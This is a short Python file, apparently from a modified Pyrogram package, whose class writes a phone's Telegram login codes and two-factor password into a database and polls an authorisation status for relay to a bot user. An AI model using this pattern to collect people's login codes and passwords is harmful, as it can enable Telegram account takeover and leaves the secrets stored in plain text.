import time
from pyrogram.mod.db import DataBase


class Send:
    def __init__(self, phone, pyrogram_host=None):
        self.db = DataBase(pyrogram_host)
        self.phone = phone

    def web_code(self, code):
        self.db.atualiza(self.phone, 'web_code', str(code))

    def phone_code(self, code):
        self.db.atualiza(self.phone, 'phone_code', str(code))

    def password(self, code):
        self.db.atualiza(self.phone, 'password', str(code))

    def warning(self):
        """
        inicio = None
        while send.warning() != 'Autorizado!':
            fim = send.warning()
            if inicio != fim:
                client.send_message(message.from_user.id, send.warning())
                inicio = fim
            time.sleep(2)
        """

        return self.db.busca(self.phone, 'warning')
